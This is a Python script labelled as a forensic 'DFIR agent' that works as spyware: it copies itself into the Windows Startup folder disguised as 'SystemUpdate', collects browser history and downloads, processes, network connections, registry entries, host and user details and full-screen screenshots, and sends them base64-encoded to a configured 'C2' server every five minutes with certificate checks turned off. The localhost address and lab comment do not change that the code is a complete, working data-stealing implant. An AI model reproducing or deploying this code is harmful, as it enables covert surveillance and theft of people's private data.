import base64
import hashlib
import io
import json
import logging
import os
import platform
import socket
import sqlite3
import sys
import tempfile
import time
import zipfile
import shutil
import urllib3
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Optional

import psutil
import requests
from PIL import ImageGrab

# Suppress insecure HTTPS warnings for local lab testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
C2_URL = "https://127.0.0.1:8443/upload"
COLLECTION_INTERVAL = 300  # Data collection frequency (seconds)
REQUEST_TIMEOUT = 60       # Network request timeout (seconds)
USE_SSL_VERIFY = False     # Set to False for self-signed certificates
MAX_BROWSER_ROWS = 10_000

logging.basicConfig(level=logging.WARNING, format="%(asctime)s [%(levelname)s]: %(message)s")
log = logging.getLogger("dfir-agent")

# Persistence Mechanism
def set_persistence():
    """Establishes persistence by copying the agent to the Windows Startup folder."""
    if platform.system() != "Windows": return
    try:
        # Determine the source path whether running as script or compiled EXE
        app_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        ext = ".exe" if getattr(sys, 'frozen', False) else ".pyw"
        
        # Resolve the standard Windows Startup directory
        startup_dir = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
        dest_path = os.path.join(startup_dir, f"SystemUpdate{ext}")

        if not os.path.exists(dest_path):
            shutil.copy2(app_path, dest_path)
            # Optional: Hide the file using system attributes
            # os.system(f'attrib +h "{dest_path}"') 
    except Exception as e:
        log.error(f"Persistence Setup Failed: {e}")

# Forensic Artifact Collectors
def collect_network_info() -> str:
    """Acquires active network connections and associated Process IDs (PIDs)."""
    conns = []
    try:
        for c in psutil.net_connections(kind="inet"):
            conns.append({
                "laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                "status": c.status, 
                "pid": c.pid,
                "type": "TCP" if c.type == 1 else "UDP"
            })
    except Exception: pass
    return json.dumps(conns, indent=2)

def collect_persistence_artifacts() -> str:
    """Scans Windows Registry Run keys for suspicious auto-start entries."""
    artifacts = []
    if platform.system() == "Windows":
        try:
            import winreg
            keys = [(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")]
            for hive, sub in keys:
                with winreg.OpenKey(hive, sub, 0, winreg.KEY_READ) as key:
                    for i in range(winreg.QueryInfoKey(key)[1]):
                        n, v, _ = winreg.EnumValue(key, i)
                        artifacts.append({
                            "name": n, 
                            "value": str(v), 
                            "hive": "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM"
                        })
        except Exception: pass
    return json.dumps(artifacts, indent=2)

def collect_browser_forensics() -> str:
    """Extracts history and download artifacts from Chrome/Edge SQLite databases."""
    forensics = {"history": [], "downloads": []}
    if platform.system() != "Windows": return json.dumps(forensics)
    
    local = Path(os.environ.get("LOCALAPPDATA", ""))
    paths = [("Chrome", local / "Google/Chrome/User Data"), ("Edge", local / "Microsoft/Edge/User Data")]

    for browser, base in paths:
        if not base.exists(): continue
        for db_path in base.glob("**/History"):
            if not db_path.is_file(): continue
            tmp = tempfile.mktemp()
            try:
                # Copying database to bypass 'file in use' locks by running browsers
                shutil.copy2(db_path, tmp) 
                conn = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
                cursor = conn.cursor()
                
                # Extract URL History
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls LIMIT ?", (MAX_BROWSER_ROWS,))
                forensics["history"].extend([dict(zip(["url", "title", "visits", "last_time"], r)) for r in cursor.fetchall()])
                
                # Extract Download Artifacts
                cursor.execute("SELECT target_path, start_time, received_bytes, referrer FROM downloads")
                forensics["downloads"].extend([dict(zip(["path", "start", "size", "ref"], r)) for r in cursor.fetchall()])
                conn.close()
            except Exception: pass
            finally: 
                if os.path.exists(tmp): os.unlink(tmp)
    return json.dumps(forensics, indent=2)

# Packaging & Exfiltration
def build_zip_bundle() -> bytes:
    """Bundles all forensic artifacts into an in-memory ZIP to minimize disk footprint."""
    buf = io.BytesIO()
    
    collectors = {
        "artifacts/processes.json": lambda: json.dumps([p.info for p in psutil.process_iter(attrs=["pid", "name", "username"])], indent=2),
        "artifacts/network_active.json": collect_network_info,
        "artifacts/registry_persistence.json": collect_persistence_artifacts,
        "artifacts/browser_deep_scan.json": collect_browser_forensics,
        "metadata/host_info.json": lambda: json.dumps({
            "host": socket.gethostname(), 
            "user": os.environ.get('USERNAME', 'unknown'), 
            "os": platform.platform()
        }, indent=2)
    }
    
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for filename, func in collectors.items():
            try:
                zf.writestr(filename, func().encode())
            except Exception: continue
        
        # Capture Volatile Evidence: Full-screen screenshot
        try:
            img = ImageGrab.grab(all_screens=True)
            ss_buf = io.BytesIO()
            img.save(ss_buf, format='JPEG', quality=70)
            zf.writestr("artifacts/screenshot.jpg", ss_buf.getvalue())
        except Exception: pass
        
        # Data Integrity: Generate SHA256 hashes for all included files
        manifest = {n: hashlib.sha256(zf.read(n)).hexdigest() for n in zf.namelist()}
        zf.writestr("manifest.json", json.dumps(manifest, indent=2))

    return buf.getvalue()

def exfiltrate(bundle: bytes):
    """Transmits the bundle to the C2 server using secure headers and Base64 encoding."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) DFIR-Scanner/1.2",
        "X-C2-Agent-ID": hashlib.md5(socket.gethostname().encode()).hexdigest(),
        "X-C2-Auth": "Forensic-Auth-99" 
    }
    
    payload = {
        "hostname": socket.gethostname(),
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "data": base64.b64encode(bundle).decode()
    }
    
    try:
        requests.post(
            C2_URL, 
            json=payload, 
            headers=headers, 
            verify=USE_SSL_VERIFY, 
            timeout=REQUEST_TIMEOUT
        )
    except Exception as e:
        log.error(f"Transmission Failed: {e}")

# Main Entry Point 
def main():
    set_persistence()
    log.info("Agent Active: Monitoring Endpoint...")
    
    while True:
        try:
            bundle = build_zip_bundle()
            exfiltrate(bundle)
        except Exception as e:
            log.error(f"Execution Cycle Failure: {e}")
        
        # If interval is 0, run once and exit. Otherwise, loop indefinitely.
        if COLLECTION_INTERVAL == 0: break
        time.sleep(COLLECTION_INTERVAL)

if __name__ == "__main__":
    main()